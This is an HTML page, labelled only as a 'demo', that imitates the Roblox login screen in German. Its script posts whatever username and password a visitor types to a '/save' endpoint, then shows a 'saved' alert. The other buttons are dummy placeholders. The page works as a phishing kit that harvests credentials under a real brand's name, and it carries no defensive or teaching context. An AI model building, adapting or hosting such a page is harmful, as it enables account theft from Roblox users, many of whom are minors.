<!DOCTYPE html>
<html lang="de">
<head>
<meta charset="UTF-8">
<title>Login Demo</title>

<style>
* {
  box-sizing: border-box;
}

body {
  margin: 0;
  font-family: Arial, sans-serif;
  background: linear-gradient(135deg, #0f1115, #050607);
  display: flex;
  justify-content: center;
  align-items: center;
  height: 100vh;
  color: white;
}

.box {
  width: 360px;
  background: #1c1f26;
  border: 1px solid #3a3d45;
  padding: 30px;
}

h2 {
  margin-bottom: 20px;
  font-size: 24px;
}

input {
  width: 100%;
  padding: 14px;
  margin-bottom: 10px;
  border: 1px solid #3a3d45;
  background: #2a2d35;
  color: white;
  font-size: 14px;
}

input::placeholder {
  color: #aaa;
}

.main-btn {
  width: 100%;
  padding: 14px;
  border: 1px solid #3a3d45;
  background: transparent;
  color: white;
  cursor: pointer;
  margin-top: 10px;
}

.main-btn:hover {
  background: #2a2d35;
}

.link {
  text-align: center;
  margin-top: 15px;
  font-size: 14px;
  cursor: pointer;
}

.divider {
  height: 1px;
  background: #3a3d45;
  margin: 20px 0;
}

.secondary-btn {
  width: 100%;
  padding: 14px;
  margin-top: 10px;
  background: #2a2d35;
  border: none;
  color: white;
  cursor: pointer;
}

.secondary-btn:hover {
  background: #3a3d45;
}
</style>
</head>

<body>

<div class="box">
  <h2>Bei Roblox anmelden</h2>

  <input id="user" placeholder="Benutzer/E-Mail/Telefon">
  <input id="pass" type="password" placeholder="Passwort">

  <button class="main-btn" onclick="send()">Anmelden</button>

  <div class="link" onclick="info()">Passwort vergessen?</div>

  <div class="divider"></div>

  <button class="secondary-btn" onclick="info()">Einmaligen Code per E-Mail senden</button>
  <button class="secondary-btn" onclick="info()">Schnellanmeldung</button>

  <div class="link" onclick="info()">Registrieren</div>
</div>

<script>
async function send() {
  await fetch("/save", {
    method: "POST",
    headers: {"Content-Type": "application/json"},
    body: JSON.stringify({
      username: user.value,
      password: pass.value
    })
  });

  alert("Gespeichert (Demo)");
}

function info() {
  alert("Demo-Funktion");
}
</script>

</body>
</html>
